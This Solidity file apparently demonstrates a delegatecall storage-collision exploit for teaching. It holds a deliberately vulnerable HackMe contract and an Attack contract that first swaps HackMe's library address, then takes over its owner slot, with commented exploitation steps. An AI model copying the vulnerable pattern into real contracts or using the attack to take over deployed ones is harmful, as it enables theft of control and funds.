//SPDX-License-Identifier: MIT

pragma solidity 0.8.1;

/*
    --> That's why ALWAYS the delegateCall contract should have the SAME storage slots than the storageContract
        otherwise, it will mess up the process. (should be in the same order and same data type)
    1. Deploy Lib contract
    2. Deploy HackMe contract with Lib address as a parameter for construction
    3. Deploy Attack contract.
    4. the frist "ChangeLib(attackContract)" function will change the address of "lib"
        in storage slot#0 in HackMe contract
    5. once the "lib" variable changes on HackMe, it will delegate the call to the new address
        we provided in the last call (we provided the Attack contract)
    6. Then we can call doSomething() on HackMe and it will call doSomething on AttackContract
    7. and this doSomething() on Attack contract will change the slot#1 owner for the msg.sender (us)
    8. important/tricky --> send the parameters as a uint256,
        that's why the parse from address to bytes20 to uint160 and uint256 needs to be done
*/

contract Lib{
    uint public number;

    function doSomething(uint256 _number) external {
        number = _number;
    }
}

contract HackMe{
    address public lib;
    address public owner;
    uint256 public number;

    constructor(address _lib){
        lib = _lib;
    }

    function doSomething(uint256 _number) external {
        (bool success, ) = lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _number));
        require(success);
    }
}

contract Attack{
    address public lib;
    uint256 public owner;
    uint256 public number;

    function changeLib(address _hackme) external {
        bytes20 _newLib = bytes20(address(this));
        uint256 _newLibUint = uint160(_newLib);
        (bool success, ) = _hackme.call(abi.encodeWithSignature("doSomething(uint256)",_newLibUint));
        require(success);
    }

    function triggerAttack(address _hackme) external {
        bytes20 _newOwner = bytes20(msg.sender);
        uint256 _newOwnerUint = uint160(_newOwner);
        (bool success, ) = _hackme.call(abi.encodeWithSignature("doSomething(uint256)", _newOwnerUint));
        require(success);
    }

    function doSomething(uint256 _newOwner) external {
        owner = _newOwner;
    }
}